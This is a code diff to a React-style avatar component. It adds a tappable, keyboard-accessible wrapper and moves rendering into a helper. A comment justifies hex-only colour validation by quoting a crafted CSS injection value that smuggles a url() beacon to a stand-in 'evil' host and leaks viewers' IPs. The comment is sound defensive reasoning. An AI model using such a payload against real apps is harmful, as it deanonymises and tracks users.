@@ -25,7 +25,17 @@ window.AvSymbol = AvSymbol;
 
 // ── the canonical avatar renderer ──
 // av = { kind:'monogram'|'symbol', color, symbol }, name used for monogram initial
-function UserAvatar({ av, name, size = 44, ring = false }) {
+function UserAvatar({ av, name, size = 44, ring = false, onTap }) {
+  const node = _userAvatarNode({ av, name, size, ring });
+  if (typeof onTap !== 'function') return node;
+  // A TAPPABLE avatar (opens the member card). stopPropagation so a row that has its own click (open a DM)
+  // does not also fire. Absent onTap, the output above is byte-for-byte what it always was.
+  const go = (e) => { if (e && e.stopPropagation) e.stopPropagation(); onTap(e); };
+  return <span role="button" tabIndex={0} aria-label={'View ' + (name || 'member') + '\'s profile'} onClick={go}
+    onKeyDown={(e) => { if (e.key === 'Enter' || e.key === ' ') { if (e.preventDefault) e.preventDefault(); go(e); } }}
+    style={{ display: 'inline-flex', lineHeight: 0, flexShrink: 0, borderRadius: 999, cursor: 'pointer' }}>{node}</span>;
+}
+function _userAvatarNode({ av, name, size, ring }) {
   // av.color comes from an untrusted kind-0 profile and is interpolated straight into CSS below (boxShadow +
   // the gradient). Accept ONLY a hex literal, so a crafted value like "#fff),url(https://evil/beacon?p=…)/*"
   // can't smuggle a url() into background and beacon every viewer's IP/online-status (deanonymisation vector).
